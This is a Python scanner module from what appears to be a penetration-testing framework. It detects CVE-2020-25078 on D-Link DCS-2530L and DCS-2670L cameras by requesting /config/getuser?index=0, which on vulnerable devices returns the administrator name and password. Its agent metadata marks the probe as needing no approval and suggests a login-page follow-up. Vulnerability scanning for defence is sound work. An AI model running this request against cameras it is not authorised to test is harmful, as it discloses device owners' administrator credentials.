#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DCS-2530L before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DCS-2530L/DCS-2670L - Administrator Password Disclosure Detection',
        'description': 'D-Link DCS-2530L before 1.06.01 Hotfix and DCS-2670L through 2.02 devices are vulnerable to password disclosures vulnerabilities because the /config/getuser endpoint allows for remote administrator password disclosure.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'dlink', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10180',
            'https://twitter.com/Dogonsecurity/status/1273251236167516161',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-25078',
            'https://github.com/pen4uin/vulnerability-research-list',
            'https://github.com/ArrestX/--POC',
        ],
        'cve': 'CVE-2020-25078',
    }

    def run(self):
        r = self.http_request(method="GET", path='/config/getuser?index=0', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('name=', 'pass=',)
        header_any = ('text/plain',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="D-Link DCS-2530L/DCS-2670L - Administrator Password Disclosure detected",
                path='/config/getuser?index=0',
            )
            return True
        return False

